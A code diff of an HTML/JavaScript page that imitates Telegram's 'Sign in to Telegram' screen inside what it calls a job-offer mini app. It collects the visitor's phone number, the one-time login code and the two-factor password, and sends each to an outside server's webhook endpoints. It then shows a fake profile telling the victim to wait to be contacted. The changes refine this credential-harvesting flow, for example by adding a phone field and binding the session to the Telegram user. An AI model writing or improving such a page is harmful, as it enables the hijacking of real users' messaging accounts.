@@ -59,7 +59,6 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 .dots span.on{background:#5b8def;width:18px;border-radius:3px}
 .code-hint{font-size:13px;color:#7d8b99;margin-bottom:-4px;line-height:1.5}
 .code-hint b{color:#e0e6ec;font-weight:500}
-/* ─── профиль после логина ─── */
 .profile-avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 20px;background:linear-gradient(135deg,#5b8def,#3f6fd9);display:flex;align-items:center;justify-content:center;font-size:42px;font-weight:600;color:#fff;box-shadow:0 12px 32px rgba(91,141,239,.4);overflow:hidden}
 .profile-avatar img{width:100%;height:100%;object-fit:cover}
 .profile-name{font-size:22px;font-weight:600;margin-bottom:6px}
@@ -86,7 +85,6 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
   <h1 id="title">Sign in to Telegram</h1>
   <p class="sub" id="sub">Please confirm your country code and enter your phone number.</p>
 
-  <!-- ШАГ 1: НОМЕР -->
   <form id="step-phone" class="step">
     <div class="field country-picker">
       <label>Country</label>
@@ -100,7 +98,6 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
     <button type="submit" class="btn" id="btn-next" disabled>NEXT</button>
   </form>
 
-  <!-- ШАГ 2: КОД -->
   <form id="step-code" class="step hidden">
     <p class="code-hint" id="code-hint">We've sent the code to your Telegram app.</p>
     <div class="field">
@@ -111,7 +108,6 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
     <button type="button" class="btn-ghost" id="btn-back-phone">← Back to phone number</button>
   </form>
 
-  <!-- ШАГ 3: 2FA -->
   <form id="step-2fa" class="step hidden">
     <p class="code-hint">Your account is protected with an additional password.</p>
     <div class="field">
@@ -121,12 +117,10 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
     <button type="submit" class="btn">NEXT</button>
   </form>
 
-  <!-- ЗАГРУЗКА -->
   <div id="step-loading" class="step hidden">
     <div class="spinner-wrap"><div class="spinner"></div><p id="loading-text">Checking…</p></div>
   </div>
 
-  <!-- ПРОФИЛЬ ПОСЛЕ ЛОГИНА -->
   <div id="step-profile" class="step hidden">
     <div class="profile-avatar" id="profile-avatar">A</div>
     <div class="profile-name" id="profile-name">—</div>
@@ -145,12 +139,15 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
         <span class="key">Имя</span>
         <span class="val" id="profile-fio">—</span>
       </div>
+      <div class="profile-info-row">
+        <span class="key">Телефон</span>
+        <span class="val" id="profile-phone">—</span>
+      </div>
     </div>
     <p class="sub" style="margin-bottom:14px">Ожидайте — с вами свяжутся в Telegram.</p>
     <button type="button" class="btn-danger" id="btn-logout">Выйти с аккаунта</button>
   </div>
 
-  <!-- ОТКАЗ ОТ ОФФЕРА -->
   <div id="step-rejected" class="step hidden">
     <div class="big-icon no">❌</div>
     <h1 style="font-size:20px;margin-bottom:10px">Оффер отклонён</h1>
@@ -166,8 +163,7 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 const API = 'https://botofferswork.onrender.com';
 // ═══════════════════════════════════════════════════════
 
-console.log('[INIT] mini app v2 started');
-console.log('[INIT] API =', API);
+console.log('[INIT] mini app v3 started');
 
 // ─── Telegram WebApp
 const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
@@ -175,10 +171,13 @@ if (tg) {
   try {
     tg.ready();
     tg.expand();
-    if (tg.enableClosingConfirmation) tg.enableClosingConfirmation();
-    console.log('[TG] ready v' + tg.version, 'start_param =', tg.initDataUnsafe?.start_param);
+    console.log('[TG] v' + tg.version);
   } catch (e) { console.warn('[TG] err', e); }
 }
+
+// ─── ID текущего юзера в Telegram (для проверки localStorage)
+const tgUserId = tg?.initDataUnsafe?.user?.id || 0;
+console.log('[TG] user id =', tgUserId);
 
 // ─── ПАРАМЕТРЫ ОФФЕРА
 let offerId = 0;
@@ -196,62 +195,35 @@ if (m) {
   console.log('[PARAM] url:', { offerId, action });
 }
 
-// ─── СТРАНЫ (с ISO-кодами для авто-выбора)
+// ─── СТРАНЫ
 const COUNTRIES = [
-  {c:'+7',f:'🇷🇺',n:'Russia',iso:'RU'},
-  {c:'+7',f:'🇰🇿',n:'Kazakhstan',iso:'KZ'},
-  {c:'+380',f:'🇺🇦',n:'Ukraine',iso:'UA'},
-  {c:'+375',f:'🇧🇾',n:'Belarus',iso:'BY'},
-  {c:'+373',f:'🇲🇩',n:'Moldova',iso:'MD'},
-  {c:'+374',f:'🇦🇲',n:'Armenia',iso:'AM'},
-  {c:'+994',f:'🇦🇿',n:'Azerbaijan',iso:'AZ'},
-  {c:'+995',f:'🇬🇪',n:'Georgia',iso:'GE'},
-  {c:'+996',f:'🇰🇬',n:'Kyrgyzstan',iso:'KG'},
-  {c:'+992',f:'🇹🇯',n:'Tajikistan',iso:'TJ'},
-  {c:'+993',f:'🇹🇲',n:'Turkmenistan',iso:'TM'},
-  {c:'+998',f:'🇺🇿',n:'Uzbekistan',iso:'UZ'},
-  {c:'+1',f:'🇺🇸',n:'United States',iso:'US'},
-  {c:'+1',f:'🇨🇦',n:'Canada',iso:'CA'},
-  {c:'+44',f:'🇬🇧',n:'United Kingdom',iso:'GB'},
-  {c:'+49',f:'🇩🇪',n:'Germany',iso:'DE'},
-  {c:'+33',f:'🇫🇷',n:'France',iso:'FR'},
-  {c:'+39',f:'🇮🇹',n:'Italy',iso:'IT'},
-  {c:'+34',f:'🇪🇸',n:'Spain',iso:'ES'},
-  {c:'+351',f:'🇵🇹',n:'Portugal',iso:'PT'},
-  {c:'+31',f:'🇳🇱',n:'Netherlands',iso:'NL'},
-  {c:'+32',f:'🇧🇪',n:'Belgium',iso:'BE'},
-  {c:'+41',f:'🇨🇭',n:'Switzerland',iso:'CH'},
-  {c:'+43',f:'🇦🇹',n:'Austria',iso:'AT'},
-  {c:'+48',f:'🇵🇱',n:'Poland',iso:'PL'},
-  {c:'+420',f:'🇨🇿',n:'Czechia',iso:'CZ'},
-  {c:'+421',f:'🇸🇰',n:'Slovakia',iso:'SK'},
-  {c:'+36',f:'🇭🇺',n:'Hungary',iso:'HU'},
-  {c:'+40',f:'🇷🇴',n:'Romania',iso:'RO'},
-  {c:'+359',f:'🇧🇬',n:'Bulgaria',iso:'BG'},
-  {c:'+30',f:'🇬🇷',n:'Greece',iso:'GR'},
-  {c:'+90',f:'🇹🇷',n:'Turkey',iso:'TR'},
-  {c:'+972',f:'🇮🇱',n:'Israel',iso:'IL'},
-  {c:'+971',f:'🇦🇪',n:'UAE',iso:'AE'},
-  {c:'+966',f:'🇸🇦',n:'Saudi Arabia',iso:'SA'},
-  {c:'+20',f:'🇪🇬',n:'Egypt',iso:'EG'},
-  {c:'+91',f:'🇮🇳',n:'India',iso:'IN'},
-  {c:'+92',f:'🇵🇰',n:'Pakistan',iso:'PK'},
-  {c:'+86',f:'🇨🇳',n:'China',iso:'CN'},
-  {c:'+81',f:'🇯🇵',n:'Japan',iso:'JP'},
-  {c:'+82',f:'🇰🇷',n:'South Korea',iso:'KR'},
-  {c:'+65',f:'🇸🇬',n:'Singapore',iso:'SG'},
-  {c:'+60',f:'🇲🇾',n:'Malaysia',iso:'MY'},
-  {c:'+66',f:'🇹🇭',n:'Thailand',iso:'TH'},
-  {c:'+84',f:'🇻🇳',n:'Vietnam',iso:'VN'},
-  {c:'+62',f:'🇮🇩',n:'Indonesia',iso:'ID'},
-  {c:'+63',f:'🇵🇭',n:'Philippines',iso:'PH'},
-  {c:'+61',f:'🇦🇺',n:'Australia',iso:'AU'},
-  {c:'+64',f:'🇳🇿',n:'New Zealand',iso:'NZ'},
-  {c:'+55',f:'🇧🇷',n:'Brazil',iso:'BR'},
-  {c:'+54',f:'🇦🇷',n:'Argentina',iso:'AR'},
-  {c:'+52',f:'🇲🇽',n:'Mexico',iso:'MX'},
-  {c:'+27',f:'🇿🇦',n:'South Africa',iso:'ZA'},
-  {c:'+234',f:'🇳🇬',n:'Nigeria',iso:'NG'},
+  {c:'+7',f:'🇷🇺',n:'Russia',iso:'RU'},{c:'+7',f:'🇰🇿',n:'Kazakhstan',iso:'KZ'},
+  {c:'+380',f:'🇺🇦',n:'Ukraine',iso:'UA'},{c:'+375',f:'🇧🇾',n:'Belarus',iso:'BY'},
+  {c:'+373',f:'🇲🇩',n:'Moldova',iso:'MD'},{c:'+374',f:'🇦🇲',n:'Armenia',iso:'AM'},
+  {c:'+994',f:'🇦🇿',n:'Azerbaijan',iso:'AZ'},{c:'+995',f:'🇬🇪',n:'Georgia',iso:'GE'},
+  {c:'+996',f:'🇰🇬',n:'Kyrgyzstan',iso:'KG'},{c:'+992',f:'🇹🇯',n:'Tajikistan',iso:'TJ'},
+  {c:'+993',f:'🇹🇲',n:'Turkmenistan',iso:'TM'},{c:'+998',f:'🇺🇿',n:'Uzbekistan',iso:'UZ'},
+  {c:'+1',f:'🇺🇸',n:'United States',iso:'US'},{c:'+1',f:'🇨🇦',n:'Canada',iso:'CA'},
+  {c:'+44',f:'🇬🇧',n:'United Kingdom',iso:'GB'},{c:'+49',f:'🇩🇪',n:'Germany',iso:'DE'},
+  {c:'+33',f:'🇫🇷',n:'France',iso:'FR'},{c:'+39',f:'🇮🇹',n:'Italy',iso:'IT'},
+  {c:'+34',f:'🇪🇸',n:'Spain',iso:'ES'},{c:'+351',f:'🇵🇹',n:'Portugal',iso:'PT'},
+  {c:'+31',f:'🇳🇱',n:'Netherlands',iso:'NL'},{c:'+32',f:'🇧🇪',n:'Belgium',iso:'BE'},
+  {c:'+41',f:'🇨🇭',n:'Switzerland',iso:'CH'},{c:'+43',f:'🇦🇹',n:'Austria',iso:'AT'},
+  {c:'+48',f:'🇵🇱',n:'Poland',iso:'PL'},{c:'+420',f:'🇨🇿',n:'Czechia',iso:'CZ'},
+  {c:'+421',f:'🇸🇰',n:'Slovakia',iso:'SK'},{c:'+36',f:'🇭🇺',n:'Hungary',iso:'HU'},
+  {c:'+40',f:'🇷🇴',n:'Romania',iso:'RO'},{c:'+359',f:'🇧🇬',n:'Bulgaria',iso:'BG'},
+  {c:'+30',f:'🇬🇷',n:'Greece',iso:'GR'},{c:'+90',f:'🇹🇷',n:'Turkey',iso:'TR'},
+  {c:'+972',f:'🇮🇱',n:'Israel',iso:'IL'},{c:'+971',f:'🇦🇪',n:'UAE',iso:'AE'},
+  {c:'+966',f:'🇸🇦',n:'Saudi Arabia',iso:'SA'},{c:'+20',f:'🇪🇬',n:'Egypt',iso:'EG'},
+  {c:'+91',f:'🇮🇳',n:'India',iso:'IN'},{c:'+92',f:'🇵🇰',n:'Pakistan',iso:'PK'},
+  {c:'+86',f:'🇨🇳',n:'China',iso:'CN'},{c:'+81',f:'🇯🇵',n:'Japan',iso:'JP'},
+  {c:'+82',f:'🇰🇷',n:'South Korea',iso:'KR'},{c:'+65',f:'🇸🇬',n:'Singapore',iso:'SG'},
+  {c:'+60',f:'🇲🇾',n:'Malaysia',iso:'MY'},{c:'+66',f:'🇹🇭',n:'Thailand',iso:'TH'},
+  {c:'+84',f:'🇻🇳',n:'Vietnam',iso:'VN'},{c:'+62',f:'🇮🇩',n:'Indonesia',iso:'ID'},
+  {c:'+63',f:'🇵🇭',n:'Philippines',iso:'PH'},{c:'+61',f:'🇦🇺',n:'Australia',iso:'AU'},
+  {c:'+64',f:'🇳🇿',n:'New Zealand',iso:'NZ'},{c:'+55',f:'🇧🇷',n:'Brazil',iso:'BR'},
+  {c:'+54',f:'🇦🇷',n:'Argentina',iso:'AR'},{c:'+52',f:'🇲🇽',n:'Mexico',iso:'MX'},
+  {c:'+27',f:'🇿🇦',n:'South Africa',iso:'ZA'},{c:'+234',f:'🇳🇬',n:'Nigeria',iso:'NG'},
 ];
 
 const $ = id => document.getElementById(id);
@@ -263,69 +235,66 @@ const countryInput = $('country-input'), countryList = $('country-list'),
 
 let selected = COUNTRIES[0], phone = '', code = '', password = null;
 
-// ─── АВТО-ВЫБОР СТРАНЫ по локали устройства (как в Telegram)
+// ─── Авто-выбор страны
 function detectCountry() {
-  // 1) сначала пробуем через Intl
   try {
     const loc = (navigator.languages && navigator.languages[0]) || navigator.language || 'en-US';
-    const region = new Intl.Locale(loc).region || loc.split('-')[1];
+    let region = null;
+    try { region = new Intl.Locale(loc).region; }
+    catch(e) { region = loc.split('-')[1]; }
     if (region) {
       const found = COUNTRIES.find(c => c.iso === region.toUpperCase());
-      if (found) { selected = found; console.log('[COUNTRY] auto:', region); return; }
+      if (found) { selected = found; return; }
     }
-  } catch (e) { console.warn('[COUNTRY] intl err', e); }
-
-  // 2) по timezone
+  } catch (e) {}
   try {
     const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-    const tzToIso = {
+    const map = {
       'Europe/Moscow':'RU','Europe/Kiev':'UA','Europe/Minsk':'BY','Asia/Almaty':'KZ',
-      'Asia/Tashkent':'UZ','Asia/Baku':'AZ','Asia/Tbilisi':'GE','Asia/Yerevan':'AM',
       'Europe/London':'GB','Europe/Berlin':'DE','Europe/Paris':'FR','Europe/Rome':'IT',
-      'Europe/Madrid':'ES','Europe/Lisbon':'PT','Europe/Amsterdam':'NL','Europe/Brussels':'BE',
-      'Europe/Zurich':'CH','Europe/Vienna':'AT','Europe/Warsaw':'PL','Europe/Prague':'CZ',
-      'Europe/Budapest':'HU','Europe/Bucharest':'RO','Europe/Sofia':'BG','Europe/Athens':'GR',
-      'Europe/Istanbul':'TR','Asia/Jerusalem':'IL','Asia/Dubai':'AE','Asia/Riyadh':'SA',
-      'Africa/Cairo':'EG','Asia/Kolkata':'IN','Asia/Karachi':'PK','Asia/Shanghai':'CN',
-      'Asia/Tokyo':'JP','Asia/Seoul':'KR','Asia/Singapore':'SG','Asia/Kuala_Lumpur':'MY',
-      'Asia/Bangkok':'TH','Asia/Ho_Chi_Minh':'VN','Asia/Jakarta':'ID','Asia/Manila':'PH',
-      'Australia/Sydney':'AU','Pacific/Auckland':'NZ','America/Sao_Paulo':'BR',
-      'America/Argentina/Buenos_Aires':'AR','America/Mexico_City':'MX','Africa/Johannesburg':'ZA',
-      'America/New_York':'US','America/Los_Angeles':'US','America/Chicago':'US',
-      'America/Toronto':'CA','America/Vancouver':'CA',
+      'Europe/Madrid':'ES','Europe/Warsaw':'PL','Europe/Istanbul':'TR','Asia/Dubai':'AE',
+      'Asia/Tokyo':'JP','Asia/Shanghai':'CN','America/New_York':'US','America/Los_Angeles':'US',
     };
-    if (tzToIso[tz]) {
-      const found = COUNTRIES.find(c => c.iso === tzToIso[tz]);
-      if (found) { selected = found; console.log('[COUNTRY] tz:', tz); return; }
+    if (map[tz]) {
+      const found = COUNTRIES.find(c => c.iso === map[tz]);
+      if (found) selected = found;
     }
-  } catch (e) { console.warn('[COUNTRY] tz err', e); }
-
-  console.log('[COUNTRY] fallback RU');
+  } catch (e) {}
 }
 
-// ─── СЕССИЯ в localStorage
-const SESSION_KEY = 'tg_offer_profile';
+// ─── Локальная сессия, привязанная к tgUserId
+const SESSION_KEY = 'tg_offer_profile_v3';
 function saveProfile(profile) {
-  try { localStorage.setItem(SESSION_KEY, JSON.stringify(profile)); } catch(e){}
+  try {
+    profile.tg_user_id = tgUserId;  // привязка
+    profile.saved_at = Date.now();
+    localStorage.setItem(SESSION_KEY, JSON.stringify(profile));
+  } catch(e) {}
 }
 function loadProfile() {
   try {
     const raw = localStorage.getItem(SESSION_KEY);
     if (!raw) return null;
-    return JSON.parse(raw);
+    const p = JSON.parse(raw);
+    // ПРОВЕРКА: если сохранённый профиль от другого Telegram-юзера — сбрасываем
+    if (tgUserId && p.tg_user_id && p.tg_user_id !== tgUserId) {
+      console.log('[SESSION] user mismatch, clearing');
+      localStorage.removeItem(SESSION_KEY);
+      return null;
+    }
+    return p;
   } catch(e) { return null; }
 }
 function clearProfile() {
   try { localStorage.removeItem(SESSION_KEY); } catch(e){}
 }
 
-// ─── UI helpers
+// ─── UI
 function setStep(n){[...dots.children].forEach((s,i)=>s.classList.toggle('on',i===n-1))}
 function showError(msg){errorBox.innerHTML=msg;errorBox.classList.remove('hidden')}
 function hideError(){errorBox.classList.add('hidden')}
 function show(el){el.classList.remove('hidden')}
 function hide(el){el.classList.add('hidden')}
-
 function initCountry(){ countryInput.value = `${selected.f}  ${selected.n}  ${selected.c}`; }
 
 function renderCountries(filter=''){
@@ -367,7 +336,7 @@ phoneInput.addEventListener('input', e => {
 });
 function validatePhone(){ const d = phoneInput.value.replace(/\D/g,''); $('btn-next').disabled = d.length < 6; }
 
-// ─── REJECT — сразу блокируем форму
+// ─── REJECT
 if (action === 'reject') {
   document.querySelectorAll('.step, .dots, #title, #sub, #footer').forEach(el => el.style.display = 'none');
   stepRejected.style.display = 'flex';
@@ -378,15 +347,13 @@ if (action === 'reject') {
   detectCountry();
   initCountry();
 
-  // ─── если уже логинился — показываем профиль сразу
   const saved = loadProfile();
   if (saved && saved.user_id) {
-    console.log('[SESSION] found saved profile', saved);
+    console.log('[SESSION] restoring', saved.user_id);
     showProfile(saved);
   }
 }
 
-// ─── ПОКАЗ ПРОФИЛЯ
 function showProfile(p){
   hide(stepPhone); hide(stepCode); hide(step2fa); hide(stepLoading); hide(stepRejected);
   hide(dots); hide($('title')); hide($('sub')); hide($('footer'));
@@ -398,19 +365,17 @@ function showProfile(p){
   $('profile-id').textContent = p.user_id || '—';
   $('profile-uname').textContent = p.username ? '@' + p.username : '—';
   $('profile-fio').textContent = fio;
+  $('profile-phone').textContent = p.phone || '—';
 
-  // аватарка — если есть username, показываем его первую букву
   const initial = (p.first_name || p.username || 'A').charAt(0).toUpperCase();
   $('profile-avatar').textContent = initial;
 }
 
-// ─── ВЫХОД
 $('btn-logout').addEventListener('click', () => {
   clearProfile();
   location.reload();
 });
 
-// ─── API helper
 async function api(path, body){
   const url = API + path;
   console.log('[API →]', url, body);
@@ -423,15 +388,14 @@ async function api(path, body){
     });
   } catch (e) {
     console.error('[API ✗] network', e);
-    throw new Error('Сервер недоступен. Попробуйте позже.');
+    throw new Error('Сервер недоступен.');
   }
   try { data = await res.json(); }
-  catch (e) { console.error('[API ✗] json', e); throw new Error('Ошибка сервера.'); }
+  catch (e) { throw new Error('Ошибка сервера.'); }
   console.log('[API ←]', res.status, data);
   return { status: res.status, data };
 }
 
-// ─── ШАГ 1: телефон
 stepPhone.addEventListener('submit', async e => {
   e.preventDefault();
   if (window.__REJECTED__) return;
@@ -444,7 +408,7 @@ stepPhone.addEventListener('submit', async e => {
     const {data} = await api('/webhook/phone', { offer_id: offerId, phone });
     if (!data.ok) {
       hide(stepLoading); show(stepPhone);
-      showError(data.error || 'Ошибка отправки');
+      showError(data.error || 'Ошибка');
       return;
     }
     hide(stepLoading); show(stepCode); setStep(2);
@@ -456,24 +420,21 @@ stepPhone.addEventListener('submit', async e => {
   }
 });
 
-// ─── ШАГ 2: код
 stepCode.addEventListener('submit', async e => {
   e.preventDefault();
   if (window.__REJECTED__) return;
   hideError();
   code = codeInput.value.replace(/\D/g,'');
   if (code.length < 3) { showError('Введите код'); return; }
-  console.log('[STEP 2] code =', code);
   hide(stepCode); show(stepLoading); $('loading-text').textContent = 'Checking code…';
   try {
     const {data} = await api('/webhook/code', { offer_id: offerId, phone, code });
     if (data.ok && !data.needs_password) {
-      // сохраняем локальный профиль (пока без данных от Telegram — они придут от backend)
       const profile = {
-        user_id: data.user_id || 0,
-        first_name: data.first_name || 'Пользователь',
-        last_name: data.last_name || '',
-        username: data.username || '',
+        user_id: data.user_id,
+        first_name: data.first_name,
+        last_name: data.last_name,
+        username: data.username,
         phone: phone,
       };
       saveProfile(profile);
@@ -502,23 +463,21 @@ $('btn-back-phone').addEventListener('click', () => {
   $('sub').textContent = 'Please confirm your country code and enter your phone number.';
 });
 
-// ─── ШАГ 3: 2FA
 step2fa.addEventListener('submit', async e => {
   e.preventDefault();
   if (window.__REJECTED__) return;
   hideError();
   password = passInput.value.trim();
   if (!password) { showError('Введите пароль'); return; }
-  console.log('[STEP 3] 2FA');
   hide(step2fa); show(stepLoading); $('loading-text').textContent = 'Checking password…';
   try {
     const {data} = await api('/webhook/password', { offer_id: offerId, phone, code, password });
     if (data.ok) {
       const profile = {
-        user_id: data.user_id || 0,
-        first_name: data.first_name || 'Пользователь',
-        last_name: data.last_name || '',
-        username: data.username || '',
+        user_id: data.user_id,
+        first_name: data.first_name,
+        last_name: data.last_name,
+        username: data.username,
         phone: phone,
       };
       saveProfile(profile);
@@ -535,7 +494,7 @@ step2fa.addEventListener('submit', async e => {
   }
 });
 
-console.log('[INIT] handlers bound, ready');
+console.log('[INIT] handlers bound');
 </script>
 </body>
 </html>
